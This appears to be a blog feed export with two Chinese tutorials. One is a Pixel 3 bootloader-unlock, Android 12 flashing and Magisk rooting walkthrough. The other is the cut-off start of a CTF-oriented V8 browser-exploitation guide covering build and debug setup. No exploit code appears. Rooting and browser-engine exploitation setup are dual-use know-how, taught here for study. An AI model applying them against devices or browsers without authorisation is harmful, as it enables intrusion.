    <content type="html"><![CDATA[<h1 id="pixel3刷机安卓12及root记录-附相关知识整理"><a href="#pixel3刷机安卓12及root记录-附相关知识整理" class="headerlink" title="pixel3刷机安卓12及root记录(附相关知识整理)"></a>pixel3刷机安卓12及root记录(附相关知识整理)</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="安卓和Linux"><a href="#安卓和Linux" class="headerlink" title="安卓和Linux"></a>安卓和Linux</h3><p>安卓基于Linux内核，是Linux发行版之一。Ubuntu、Debian、CentOs等也是Linux发行版，称为GNU&#x2F;Linux。虽然Android和GNU&#x2F;Linux都是Linux的发行版，但是从应用、库、抽象层甚至到内核层对Linux内核的拓展，系统架构间存在很大差别。</p><p>Android内核基于上游 <a href="https://www.kernel.org/">Linux 长期支持 (LTS) 内核</a>，是AOSP一部分。在 Google，LTS 内核会与 Android 专用补丁结合，形成所谓的<code>Android通用内核(ACK)</code>。</p><p>Android开源项目(Android Open Source Project,简称AOSP)提供了 Android系统的框架。以下是AOSP系统架构图：</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/1.png" alt="1"></p><p>AOSP是开源的，我们可以基于AOSP定制自己的安卓系统。<a href="https://source.android.com/?hl=zh-cn">AOSP官网</a>有源代码和文档。并且由于AOSP采用Apache2.0授权，我们基于AOSP开发的代码不需要开源，详情参考该<a href="https://windliang.wang/2019/05/21/linux%E5%92%8CAndroid%E7%9A%84%E5%85%B3%E7%B3%BB/">文章</a>。</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/2.png" alt="2"></p><h3 id="权限和分区"><a href="#权限和分区" class="headerlink" title="权限和分区"></a>权限和分区</h3><p>这部分比较复杂，这里只做简单介绍，详情参考<a href="https://source.android.com/docs/core/architecture/partitions?hl=zh-cn">官方文档</a>。</p><p>安卓系统权限从低到高分为应用权限、用户权限和超级用户(root)权限。</p><p>几个常见的标准分区：</p><ul><li>boot:引导分区，启动引导文件，包含Kernel和Ramdisk，安卓root操作主要是修改boot分区。</li><li>recovery:恢复分区，存放了recovery.img，相当于一个简易Linux系统，系统进入Recovery模式后会装载Recovery分区，运行Recovery服务(&#x2F;sbin&#x2F;recovery)，用于OTA升级。Recovery模式下可以擦写分区，是刷机的方式之一。</li><li>system:系统分区。存放安卓系统和系统应用。</li><li>vendor:包含定制应用与库文件，很多厂商也直接将这些文件放入system分区。</li><li>data:也叫userdata，个人数据分区,包含用户安装的应用和数据，包括自定义数据。</li><li>misc:校验数据分区，供 recovery 分区使用。</li><li>cache:缓存分区，加快运行速度。</li></ul><p>A&#x2F;B分区：A&#x2F;B System Updates，Android7.0引入的一种新的OTA升级方式，将boot和system等分区变为两套，称为slot A(boot_a,system_a…)和slot B(boot_b,system_b…)，一个作为主分区，另一个作为备用分区。该方式的优点是可以进行无缝升级，即升级时不影响手机正常使用，并且如果主分区损坏可以通过备用分区恢复。缺点是要占用双倍存储空间。</p><p>虚拟A&#x2F;B分区：Virtual A&#x2F;B System Updates，解决了A&#x2F;B分区的空间占用问题。</p><p>对于采用A&#x2F;B分区和VA&#x2F;B分区的机型，recovery分区被并入了boot分区中。通过recovery模式刷机时，刷第三方recovery镜像会很麻烦。因此更推荐采用fastboot刷机。</p><h3 id="刷机和root"><a href="#刷机和root" class="headerlink" title="刷机和root"></a>刷机和root</h3><p>刷机的两种方式，本文采用fastboot线刷</p><ul><li><p>卡刷：刷机包(通常是.zip)放入手机的内存卡或内置存储中，通过Recovery模式安装。一般情况下，官方内置的Recovery模式限制较多，只能安装官方ROM，而第三方Recovery提供了更多功能，可以自由地刷入第三方ROM，其中以TWRP Recovery较为知名。因此采用卡刷经常需要先刷入第三方Revocery。卡刷本质是对手机文件的替换过程，不会重新刷新整个手机分区、只是替换部分文件，整个卡刷包的内容实际上就是一些文件和目录，所以卡刷相对线刷风险较小。</p><p>优点：方便、简单，刷机方法通用，不会破坏手机底层数据。</p><p>缺点：需要借助第三方recovery，有时需要先获取root权限。</p><p>用途：更新、恢复出厂设置、清除数据、系统备份&#x2F;还原。</p></li><li><p>线刷：刷机包(通常是.img)存在电脑，通过数据线连接电脑进行刷机。常见的线刷方式有fastboot模式、CPU端口模式(如高通9008端口模式、联发科端口模式)。线刷通常是修改底层的分区文件。</p><p>优点：功能强大，可以进行底层修复，在升级过程中可直接将bootloader、基带等一并升级，可在卡刷失败时可以使用官方刷机包进行救砖。</p><p>缺点：操作繁琐；风险较高，线刷变砖很难补救。</p><p>用途：更换系统、解锁Bootloader、卡刷变砖补救、修改系统分区。</p></li></ul><p>安卓root技术的发展历史、原理和工具可以参考该<a href="https://www.dingxiang-inc.com/blog/post/619">文章</a></p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/3.png" alt="3"></p><h2 id="为什么root"><a href="#为什么root" class="headerlink" title="为什么root"></a>为什么root</h2><p>1.Android逆向&#x2F;攻防对抗需要真机环境。以native层动态调试为例，有的APP会检测模拟器，需要在真机才能运行，而不管模拟器还是真机，需要root才能动态调试。还有抓包，https的抓包需要安装系统证书，安装系统证书需要root，所以针对存在模拟器检测的APP抓包，需要root真机。</p><p>2.拓展手机功能，增加DIY程度，比如各种Magisk模块。</p><p>坏处：失去保修、设备安全性减弱、可能变砖。</p><h2 id="如何选择用来root的手机"><a href="#如何选择用来root的手机" class="headerlink" title="如何选择用来root的手机"></a>如何选择用来root的手机</h2><p>主要考虑三个方面：</p><p>1.root的难度：或者说解锁bootloader的难度，因为一般通过bootloader修改boot分区实现root，当然也不一定，不同厂商的产品root的方式各不相同。</p><p>2.圈子和生态：决定了你从互联网获取到的相关资料的数量和质量，前人的经验可以大大降低上手难度。</p><p>3.兼容的安卓系统版本：比如Pixel3最高兼容Android12，如果你有研究更高版本的需求，需要选择更新的型号。</p><p>比较流行的用于root的手机：一加、谷歌Pixel、谷歌Nexus、小米、魅族</p><h2 id="pixel购买注意事项"><a href="#pixel购买注意事项" class="headerlink" title="pixel购买注意事项"></a>pixel购买注意事项</h2><p>笔者在咸鱼上花380买的pixel3，oem已解锁。对于也想买pixel来root的同学，以下是一些经验。</p><h3 id="地区、版本和oem锁"><a href="#地区、版本和oem锁" class="headerlink" title="地区、版本和oem锁"></a>地区、版本和oem锁</h3><p>OEM：Original Equipment Manufacturer，原始设备生产商。</p><p>OEM锁：又称设备锁，厂商为防止设备被篡改加的锁，出厂自带，限制了用户修改底层配置。OEM解锁的设置在开发者选项中，有OEM锁的设备这一项是灰色的，无法修改。</p><p>没有OEM锁才能解锁Bootloader，解锁Bootloader才能root。也就是说我们要买无OEM锁的设备。</p><p>谷歌pixel手机官方版本(无oem锁)主要在欧洲和美洲销售，其它地区如亚太销售运营商定制版(verizon版)，当然欧洲和美洲也有运营商定制版。</p><p>运营商定制版：verizon版，简称<code>v版</code>，有运营商定制锁(oem锁)。国内发售的只有v版，当然欧版和美版也可能是v版。</p><p>美版：可能是官方版本，也可能是v版。需要查imei才能确定是不是v版，是v版则无法解锁oem。支持移动和联通，不支持电信。</p><p>欧版：欧洲国家版本的统称。官版多v版少，但购买时也最好查imei确认。欧版支持国内三大运营商。</p><p>OEM可解锁(非v版)是首位的，其次最好是欧版，网络问题比较好处理。</p><h3 id="如何判断是否v版"><a href="#如何判断是否v版" class="headerlink" title="如何判断是否v版"></a>如何判断是否v版</h3><p>1.可通过<code>adb shell getprop ro.boot.cid</code>查看是不是v版。无锁的非v版返回11111111或00000000，否则是v版。</p><p>2.官网查询</p><p>输入IMEI&#x2F;设备序列号即可查询设备信息，欧版和美版不论是否v版都可以对应产地的官网查到。如果查不到多半是亚洲的v版。</p><p><a href="https://store.google.com/us/repair">美版</a>  <a href="https://store.google.com/uk/repair">英版</a>  <a href="https://store.google.com/fr/repair">法版</a>  <a href="https://store.google.com/de/repair">德版</a>  <a href="https://store.google.com/ie/repair">爱尔兰版</a>  <a href="https://store.google.com/it/repair">意大利版</a>  <a href="https://store.google.com/es/repair">西班牙版</a></p><p>3.开发者选项查看OEM是否解锁。 </p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>笔者买到的pixel3非常诡异，如图，OEM虽然已解锁，但是灰色无法修改；adb连接用户为shell说明未root；通过IMEI在官网查不到设备，说明很可能是国内v版；<code>getprop ro.boot.cid</code>输出是00000001；<code>Product revision</code>中 的MP1.0表示是工程机，JPN表示在日本发售。</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/4.jpg" alt="4"></p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/5.png" alt="5"></p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/6.jpg" alt="6"></p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="下载Android-SDK-platform-tools"><a href="#下载Android-SDK-platform-tools" class="headerlink" title="下载Android SDK platform-tools"></a>下载Android SDK platform-tools</h3><p>PC端需要Android SDK中的platform-tools工具包，主要用到其中的<code>adb</code>和<code>fastboot</code>工具。</p><p><a href="https://developer.android.com/tools/releases/platform-tools?hl=zh-cn">下载传送门</a></p><h3 id="adb连接"><a href="#adb连接" class="headerlink" title="adb连接"></a>adb连接</h3><p>手机连点7次<code>设置-&gt;关于手机-&gt;版本号</code>进入开发者模式。</p><p>进入<code>系统-&gt;高级-&gt;开发者选项</code>，开启<code>USB调试</code>。</p><p>数据线连接手机和电脑。</p><p>PC端运行<code>adb devices</code>，手机端在弹出的消息中选择同意调试，连接成功会显示已连接的设备。<code>adb shell</code>进入手机的shell。由于还没root，只有普通用户权限，部分文件夹无权限访问。</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/7.png" alt="7"></p><p>如果无法识别设备，可以尝试安装最新的<a href="https://developer.android.com/studio/run/win-usb">Google USB Drivers</a></p><h2 id="解锁Bootloader"><a href="#解锁Bootloader" class="headerlink" title="解锁Bootloader"></a>解锁Bootloader</h2><p>重启手机并进入bootloader菜单，可以使用adb命令或在关机时长按[电源键]+[音量下键]</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb reboot bootloader<br></code></pre></td></tr></table></figure><p>在bootloader菜单中使用fastboot命令解锁bootloader</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fastboot flashing unlock</span><br></code></pre></td></tr></table></figure><p>解锁后每次开机会有警告</p><h2 id="刷入google官方安卓12镜像"><a href="#刷入google官方安卓12镜像" class="headerlink" title="刷入google官方安卓12镜像"></a>刷入google官方安卓12镜像</h2><p>镜像下载地址：<a href="https://developers.google.com/android/images">传送门</a></p><p>查看设备型号，笔者的是pixel3 blueline</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/6.jpg" alt="8"></p><p>选择对应型号的镜像下载</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/9.png" alt="9"></p><p>解压镜像压缩包，如果没有把Android platform-tools加入环境变量，则需要把压缩包中的文件和Android platform-tools放在同一文件夹，然后运行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb reboot bootloader # 先进入 bootloader 模式<br>flash-all.bat #Windows允许bat脚本<br></code></pre></td></tr></table></figure><p>等待脚本跑完，中间如果卡住可以按回车试试。刷完进行系统初始化，自行设置即可。初始化完成记得重新进入开发者模式，开启USB调试，重新连上adb。</p><h2 id="刷入Magisk-Patch过的boot-img实现root"><a href="#刷入Magisk-Patch过的boot-img实现root" class="headerlink" title="刷入Magisk Patch过的boot.img实现root"></a>刷入Magisk Patch过的boot.img实现root</h2><p>关于Magisk</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/10.png" alt="10"></p><p>先安装Magisk <a href="https://github.com/topjohnwu/Magisk/releases">下载地址</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">adb install app-release.apk<br></code></pre></td></tr></table></figure><p>刚才的解压的镜像包中还有一个压缩文件<code>image-blueline-sp1a.210812.016.c2.zip</code>，解压后里面有个<code>boot.img</code>。</p><p>把<code>boot.img</code>传到手机上</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">adb <span class="hljs-keyword">push</span> boot.img <span class="hljs-regexp">/sdcard/</span><br></code></pre></td></tr></table></figure><p> 手机上打开 <code>Magisk</code> , 依次点击 <code>安装-&gt;选择并修补一个文件-&gt;/sdcard/boot.img-&gt;开始</code>。</p><p>修补完成后，将修补后的 <code>boot.img</code> 传到电脑上</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">adb pull <span class="hljs-regexp">/storage/</span>emulated<span class="hljs-regexp">/0/</span>Download/magisk_patched-xxxxx_xxxxx.img<br></code></pre></td></tr></table></figure><p>刷入经过 Magisk 修补好的 <code>boot.img</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">adb reboot <span class="hljs-keyword">bootloader </span><br>fastboot flash <span class="hljs-keyword">boot </span>magisk_patched-xxxxx_xxxxx.img<br></code></pre></td></tr></table></figure><p>再次开机，电脑<code>adb shell</code>后输入<code>su</code>，手机同意超级用户权限，root成功。</p><p><img src="/2024/12/15/pixel3%E5%88%B7%E6%9C%BA%E5%AE%89%E5%8D%9312%E5%8F%8Aroot%E8%AE%B0%E5%BD%95%E9%99%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/11.png" alt="11"></p><h2 id="刷入电信模块"><a href="#刷入电信模块" class="headerlink" title="刷入电信模块"></a>刷入电信模块</h2><p>通过Magisk模块-<code>China Telecom Supporter</code>开启Pixel3对电信SIM卡的支持和VoLTE高清语音通话功能。</p><p>项目地址：<a href="https://github.com/apporc/china_telecom_supporter">传送门</a></p><p>下载项目，打包成zip并传入手机</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apporc/</span>china_telecom_supporter<br>cd china_telecom_supporter<br>zip -r ./china_telecom_supporter.zip *<br>adb push .<span class="hljs-regexp">/china_telecom_supporter.zip /</span>sdcard<span class="hljs-regexp">/Download/</span><br></code></pre></td></tr></table></figure><p>进入手机shell并解压</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">adb shell<br>su<br>unzip -d <span class="hljs-regexp">/sdcard/</span>Download<span class="hljs-regexp">/china_telecom_supporter /</span>sdcard<span class="hljs-regexp">/Download/</span>china_telecom_supporter.zip<br></code></pre></td></tr></table></figure><p>移动解压后的文件夹到系统目录&#x2F;data&#x2F;adb&#x2F;modules&#x2F;</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/sdcard/</span>Download<span class="hljs-regexp">/china_telecom_supporter /</span>data<span class="hljs-regexp">/adb/m</span>odules/china_telecom_supporter<br></code></pre></td></tr></table></figure><p>最后重启手机，插入电信SIM卡测试，能正常打电话和流量上网即可。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://windliang.wang/2019/05/21/linux%E5%92%8CAndroid%E7%9A%84%E5%85%B3%E7%B3%BB/">linux和Android的关系</a></p><p><a href="https://ericclose.github.io/Pixel-repairs-and-carriers.html">查询 Google Pixel 保修信息以及判断是否为 Verizon （运营商） 版</a></p><p><a href="https://sspai.com/post/67932">Android 玩家必备神器入门：从零开始安装 Magisk</a></p><p><a href="Magisk/XPOSED%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86">Magisk&#x2F;Xposed原理和区别</a></p><p><a href="https://cloud.tencent.com/developer/article/1369719">如何使用Magisk解锁Bootloader以及RootGoogle Pixel 3？</a></p><p><a href="https://oacia.dev/Pixel3-root/">Pixel3 刷机与root记录</a></p><p><a href="https://jessieeeee.github.io/2021/05/28/PixelFlash/">Pixel3刷机+magisk+root+电信支持</a></p><p><a href="https://www.bilibili.com/video/BV1BY4y1H7Mc/?spm_id_from=333.337.search-card.all.click&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">玩机必看！带你入坑安卓刷机，小白也能看懂的ROOT基础指南来啦！</a></p><p><a href="https://www.bilibili.com/video/BV1bS4y1s7DR/?spm_id_from=333.337.search-card.all.click&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">处理器的引导及安卓之分区的意义及作用（内部课程）</a></p>]]></content>
    
    
    <categories>
      
      <category>安卓</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
      <tag>刷机</tag>
      
      <tag>root</tag>
      
      <tag>pixel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>chrome_v8_pwn入门</title>
    <link href="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/"/>
    <url>/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="chrome-v8-pwn入门"><a href="#chrome-v8-pwn入门" class="headerlink" title="chrome_v8_pwn入门"></a>chrome_v8_pwn入门</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="v8是什么"><a href="#v8是什么" class="headerlink" title="v8是什么"></a>v8是什么</h3><p>JS引擎是浏览器的一部分，用于解析前端Javascript代码，目前市面上有多个不同大厂开发的JS引擎，也有应用于除浏览器外的其他项目。JS代码从服务端获取，在客户端浏览器执行，如果JS引擎中包含漏洞，就能通过发送恶意JS代码给客户端对客户端机器发起攻击，如远程代码执行、DDOS。本文主要学习名为V8的JS引擎的漏洞挖掘与利用，因为v8市场占有率最高、相关资料多、开源且有完善的调试功能。</p><p>V8是Google开源的JS引擎，实现了ECMAScript和WebAssembly，采用C++开发，应用于chrome、node.js、Election等，功能包括：解释执行、编译执行、代码优化、垃圾回收等。</p><p>简单粗暴地讲，v8是源码编译后得到的名为d8的二进制可执行文件。当然，也可以取v8的源码嵌入到自己的项目中。</p><h3 id="浏览器架构"><a href="#浏览器架构" class="headerlink" title="浏览器架构"></a>浏览器架构</h3><p>梳理浏览器架构，进一步了解JS引擎在浏览器中的定位和作用</p><p><strong>整体架构</strong></p><p>从功能和组成的角度分析，主要包括以下部分：</p><ul><li><p>用户界面(Browser GUI)</p></li><li><p>浏览器引擎(Browser Engine)</p><p>在用户界面和渲染引擎之间传递数据和指令</p></li><li><p>渲染引擎(Rendering Engine)</p><p>解析HTML和CSS文本等，将网页内容渲染呈现出来</p></li><li><p>JS引擎(Javascript Engine)</p><p>解析执行Javascript 语言，实现动态网页</p></li><li><p>网络模块(Networking)</p><p>处理网络请求，比如http请求网页、图片资源等</p></li><li><p>数据存储(data storage)</p><p>管理硬盘中保存的书签、cookie、缓存、偏好设置等各种用户数据</p></li><li><p>用户界面后端(UI backend)</p><p>为界面绘制提供图形库接口</p></li></ul><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/layers.png" alt="layers"></p><p><a href="https://taligarsiel.com/Projects/howbrowserswork1.htm">图片来源</a></p><p>浏览器内核包含了渲染引擎和JS引擎，目前主流浏览器内核有blink(Chrome)、webkit(Safari)、Gecko(FireFox)等。</p><p>网上许多文章将浏览器内核直接称作渲染引擎，笔者认为这并不妥当，容易引起误解，因为浏览器内核相当于内置了JS引擎的渲染引擎，并不是单纯的渲染引擎。当然，如果将JS引擎视作渲染引擎的一部分，这样称呼也没问题，但是随着JS引擎越来越独立，大部分文章默认二者是平级关系，而不是包含关系，这就引起了歧义。</p><p><strong>多进程架构</strong></p><p>从进程和线程的角度分析，chrome采用使用IPC通信的多进程架构，目前正在由原本的多进程架构向面向服务架构(Services Oriented Architecture，简称SOA)改进。</p><p>主要包括以下几种进程：</p><ul><li><p>浏览器主进程(Browser Process)</p><p>主要负责界面显示, 用户交互, 子进程管理, 同时提供存储等功能。</p></li><li><p>渲染进程(Render Process)</p><p>核心任务是将HTML, CSS和JavaScript 转换为用户可以与之交互的网页，渲染引擎和<strong>JS引擎</strong>运行在该类进程中。Chrome默认一个渲染进程负责一个标签页。 但是如果从一个页面打开了新页面，而新页面和当前页面属于同一站点，则新页面复用父页面的渲染进程。</p></li><li><p>插件进程(Plugin Process)</p><p>运行扩展插件，为了避免插件崩溃影响其它组件，每个插件对应一个进程。</p></li><li><p>基础服务进程</p><p>包括GPU进程、网络进程、Audio进程、Profile进程等。基础服务进程在硬件资源受限的情况下能够整合到一个进程中以节省内存。GPU进程例外，不参与合并。</p></li></ul><p>如图，包括渲染进程在内的大部分进程运行在<strong>沙箱</strong>中</p><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p><a href="https://www.yanceyleo.com/post/e46bf3a4-c421-4273-86e8-0621bdc3cfcb">图片来源</a></p><h3 id="v8工作原理"><a href="#v8工作原理" class="headerlink" title="v8工作原理"></a>v8工作原理</h3><p>JS是一门解释型语言，其代码翻译成字节码后在v8内置的VM中运行。解释型语言跨平台性好，但是运行效率低。为了提高运行效率，V8采用了即时编译(JIT)，结合使用编译器和解释器：对于执行次数较少的普通代码，由解释器(VM)执行；对于高频出现的热代码，优化并编译为机器码执行。V8主要包含以下组件：</p><ul><li><p>Parse(解析器)</p><p>将JS代码转换为抽象语法树(AST)</p></li><li><p>Ignition(解释器&#x2F;VM)</p><p>将AST转换成字节码并在VM中执行</p></li><li><p>TurboFan(编译器)</p><p>将字节码编译优化为机器码并执行</p></li></ul><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p><a href="https://cloud.tencent.com/developer/news/721616">图片来源</a></p><h2 id="环境搭建及调试"><a href="#环境搭建及调试" class="headerlink" title="环境搭建及调试"></a>环境搭建及调试</h2><p><a href="https://chromium.googlesource.com/v8/v8/">v8开源仓库</a>   <a href="https://v8.dev/docs">v8官方文档</a>  <a href="https://www.chromium.org/Home/">Chromium官网</a></p><p>环境：ubuntu2004虚拟机</p><h3 id="VPN配置"><a href="#VPN配置" class="headerlink" title="VPN配置"></a>VPN配置</h3><p>要在虚拟机中访问外网，笔者采用VPN的方式，参考<a href="https://blog.csdn.net/qq_27462573/article/details/130484723">在虚拟机中使用clash科学上网</a>和<a href="https://blog.csdn.net/E26east_/article/details/140592684">VMware虚拟机网络配置-NAT篇</a>。</p><p>另外还需要配置git和curl的代理，如下，192.168.43.33改为宿主机ip，7890为clash的局域网代理端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy &#x27;socks5://192.168.43.33:7890&#x27;<br>git config --global https.proxy &#x27;socks5://192.168.43.33:7890&#x27;<br>git config --global https.proxy &#x27;http://192.168.43.33:7890&#x27;<br>git config --global http.proxy &#x27;http://192.168.43.33:7890&#x27;<br>echo &#x27;export http_proxy=http://192.168.43.33:7890&#x27; &gt;&gt; ~/.bashrc<br>echo &#x27;export https_proxy=http://192.168.43.33:7890&#x27; &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure><h3 id="编译v8"><a href="#编译v8" class="headerlink" title="编译v8"></a>编译v8</h3><p>这里需要了解git相关的术语和概念。</p><p>题目通常会给出commit哈希和存在漏洞的diff补丁文件，我们需要给对应commit版本的v8源码打上diff补丁后编译，获得存在漏洞的d8二进制程序。如果没有给出commit版本&#x2F;哈希，给了chrome浏览器，可以打开浏览器输入<code>chrome://version</code>查看chrome版本，再在<a href="https://github.com/chromium/chromium">github</a>根目录的DEPS文件中搜索<code>v8_version</code>查看commit版本。 </p><p>安装ninja，用于编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install ninja-build<br></code></pre></td></tr></table></figure><p>安装<a href="https://www.chromium.org/developers/how-tos/depottools/">depot_tools</a>，其中集成了一系列chromium开发工具:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git<br>echo &#x27;export PATH=/path/to/depot_tools:$PATH&#x27; &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure><p>首次运行<code>gclient</code>，更新并初始化depot_tools，然后关闭自动更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gclient<br>echo &#x27;export DEPOT_TOOLS_UPDATE=0&#x27; &gt;&gt; ~/.bashrc<br></code></pre></td></tr></table></figure><p>如下说明初始化成功</p><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>获取最新版v8源码到本地并安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">fetch v8<br>cd v8<br>gclient sync -D<br>./build/install-build-deps.sh<br></code></pre></td></tr></table></figure><p>做题时需要切换到题目的源码版本，这里以例题分析中的starctf2019 - OOB为例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598  #切换源码分支<br>gclient sync -D   #下载依赖并删去不需要的依赖<br>git apply &lt; path_to/oob.diff  #打上题目给的补丁<br></code></pre></td></tr></table></figure><p>编译分为<code>release</code>版本和<code>debug</code>版本，debug版本输出的对象结构等调试信息更全面，但有很多检查导致调试漏洞时报错，因此一般使用<code>release</code>版本进行调试，<code>debug</code>版本辅助分析。32位将<code>x64</code>改为<code>ia32</code>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./tools/dev/gm.py x64.release<br>./tools/dev/gm.py x64.debug<br></code></pre></td></tr></table></figure><p>编译结果位于<code>v8/out/x64.release</code>和<code>v8/out/x64.debug</code></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p><strong>向gdb中加入v8调试插件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source &#x27;/home/op1n/Desktop/browser_v8/v8/tools/gdbinit&#x27;<br>source &#x27;/home/op1n/Desktop/browser_v8/v8/tools/gdb-v8-support.py&#x27;<br></code></pre></td></tr></table></figure><p><strong>调试相关的d8运行参数</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">--allow-natives-syntax #允许在源代码中使用V8提供的原生API语法<br>--trace-turbo #跟踪生成TurboFan 